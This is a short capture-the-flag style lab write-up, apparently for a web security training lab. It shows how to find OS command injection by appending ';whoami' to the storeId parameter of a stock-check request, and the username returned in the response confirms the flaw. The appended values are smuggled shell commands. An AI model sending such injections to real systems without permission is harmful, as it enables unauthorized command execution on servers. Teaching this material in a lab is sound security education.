#     Lab: OS command injection, simple case

Access one of the product pages.

![Product page](https://github.com/user-attachments/assets/df70032e-6ee8-47f8-a3cc-1223f9084efb)

The product is accessed using the following GET request:

```http
GET /product?productId=1
```

Try modifying the `productId` parameter:

```text
/product?productId=1
→
/product?productId=1;whoami
```

![Invalid product ID](https://github.com/user-attachments/assets/703553cf-86fd-4c84-9bf9-b8eb88d57102)

The server responds with:

```text
Invalid product ID
```

This suggests that `productId` is validated or handled separately and is not directly passed into an OS command.

## Stock Check

The product page also contains a **Check stock** function.

![Check stock button](https://github.com/user-attachments/assets/92483c80-014b-44d7-ab05-498a3e42569f)

Use Burp Suite to intercept the stock-check request.

![Burp Suite request](https://github.com/user-attachments/assets/a65c6222-0fd5-4933-8383-4d2d874ebb53)

The request contains the following parameters:

```text
productId=1&storeId=1
```

Test the `storeId` parameter for OS command injection:

```text
productId=1&storeId=1
→
productId=1&storeId=1;whoami
```

![Command injection result](https://github.com/user-attachments/assets/c3764756-90e4-420c-b7c2-08579e230877)

The response includes:

```text
peter-FOQOdA
```

This confirms an **OS command injection vulnerability** in the `storeId` parameter. The application appears to pass the parameter into an OS command without sufficient input validation or safe command execution.
